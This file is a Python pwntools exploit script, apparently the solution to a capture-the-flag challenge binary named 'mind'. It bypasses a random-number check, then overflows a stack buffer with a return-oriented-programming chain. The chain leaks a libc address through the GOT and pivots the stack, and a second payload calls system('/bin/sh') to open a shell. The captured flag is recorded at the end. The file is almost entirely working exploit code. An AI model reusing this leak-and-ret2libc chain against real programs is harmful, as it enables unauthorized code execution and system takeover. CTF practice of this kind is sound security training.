from pwn import *

context.binary = "./mind"
context.encoding = "latin-1"
context.terminal= ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

elf=context.binary
rop=ROP(elf)
libc=ELF("./lib/libc.so.6")

PUTS_GOT = elf.got["printf"]
PUTS_PLT = elf.plt["puts"]
MAIN_PLT = elf.symbols["main"]
pop_rdi = rop.find_gadget(["pop rdi","ret"]).address
pop_rbp = rop.find_gadget(["pop rbp","ret"]).address
ret     = rop.find_gadget(["ret"]).address

r = process("./mind")#remote("pwn.chal.ctf.gdgalgiers.com", 1404)

r1 = process("./rng")
rand1, rand2 = r1.clean().split()
r1.close()

payload = b""
payload += rand1
payload += b"\x00"
payload += b"A" * (56 - len(payload))
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(PUTS_GOT)
payload += p64(PUTS_PLT)
payload += p64(pop_rbp)
payload += p64(0x404f00) #writeable address! # stack pivoting!!!
# needed to give a large stack, since system() kind fills up the stack
# writable region is 0x404000 - 0x405000
payload += p64(MAIN_PLT + 90)

r.sendline(payload)
sleep(4)

data = b""
while r.can_recv():
    data += r.recv()

leak = data.split(b'\n')[-2]
leak = int.from_bytes(leak,'little')
LIBC_BASE = leak - 0x64e10

log.info(f"libc -> {LIBC_BASE:08x}")

SYSTEM = LIBC_BASE + libc.symbols["system"]
EXIT   = LIBC_BASE + libc.symbols["exit"]
BINSH  = LIBC_BASE + next(libc.search(b"/bin/sh"))

payload = b""
payload += rand2
payload += b"\x00"
payload += b"A" * (56 - len(payload))
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(BINSH)
payload += p64(SYSTEM)
payload += p64(EXIT)

# gdb.attach(r, gdbscript='''
# b *main+90
# ''')
# input()

r.sendline(payload)
r.interactive()
# CyberErudites{Putt1nG_4n_END_to_Th1S_m4DN3s$_0NcE_4Nd_F0r_4Nd_ALl}